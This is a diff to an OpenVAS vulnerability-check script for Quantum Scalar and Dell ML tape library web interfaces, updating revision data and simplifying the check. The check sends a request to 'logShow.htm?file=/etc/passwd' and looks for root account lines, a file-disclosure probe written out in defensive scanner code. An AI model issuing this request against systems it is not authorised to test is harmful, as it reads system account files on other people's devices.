@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_quantum_scalar_52566.nasl 5931 2017-04-11 09:02:04Z teissa $
+# $Id: gb_quantum_scalar_52566.nasl 7277 2017-09-26 12:45:58Z cfischer $
 #
 # Multiple Vendor Products Security Vulnerabilities
 #
@@ -55,7 +55,7 @@ if (description)
  script_cve_id("CVE-2012-1841","CVE-2012-1842","CVE-2012-1844");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 5931 $");
+ script_version ("$Revision: 7277 $");
 
  script_name("Multiple Vendor Products Security Vulnerabilities");
 
@@ -63,7 +63,7 @@ if (description)
  script_xref(name : "URL" , value : "http://www.quantum.com/ServiceandSupport/SoftwareandDocumentationDownloads/SI500/Index.aspx");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/913483");
 
- script_tag(name:"last_modification", value:"$Date: 2017-04-11 11:02:04 +0200 (Tue, 11 Apr 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-09-26 14:45:58 +0200 (Tue, 26 Sep 2017) $");
  script_tag(name:"creation_date", value:"2012-04-11 09:50:54 +0200 (Wed, 11 Apr 2012)");
  script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -82,21 +82,15 @@ include("http_keepalive.inc");
 include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 
-url = string(dir, "/index.htm"); 
-
+url = string("/index.htm"); 
 if(http_vuln_check(port:port, url:url,pattern:"(<title>QUANTUM - Scalar|<title>DELL - ML.* Login Screen)")) {
 
-  url = dir + '/logShow.htm?file=/etc/passwd';
-
+  url = '/logShow.htm?file=/etc/passwd';
   if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
-     
     security_message(port:port);
     exit(0);
-
   }  
-
 }
 
 exit(0);
